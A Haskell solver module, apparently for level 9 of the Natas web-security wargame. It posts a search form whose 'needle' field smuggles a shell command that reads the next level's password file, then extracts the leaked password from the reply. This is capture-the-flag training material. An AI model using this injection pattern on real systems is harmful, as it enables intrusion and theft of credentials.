{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas9 where

import           Data.Maybe           (catMaybes)

import           Data.ByteString.Lazy (ByteString)
import           Safe                 (headMay, lastMay)

import           Network.Wreq         (FormParam ((:=)), postWith)

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  let needle = "\"a\"; cat /etc/natas_webpass/natas10" :: ByteString
      form = ["needle" := needle, "submit" := ("Search" :: ByteString)]
  opts <- loginOptions 9
  req <- postWith opts (parentUri 9) form
  let body = reqBody req
      match = catMaybes (workupBody' (fmap headMay) body)
  pure $ penultimateMay match

penultimateMay :: [a] -> Maybe a
penultimateMay xs = fst <$> lastMay (zip xs (drop 1 xs))
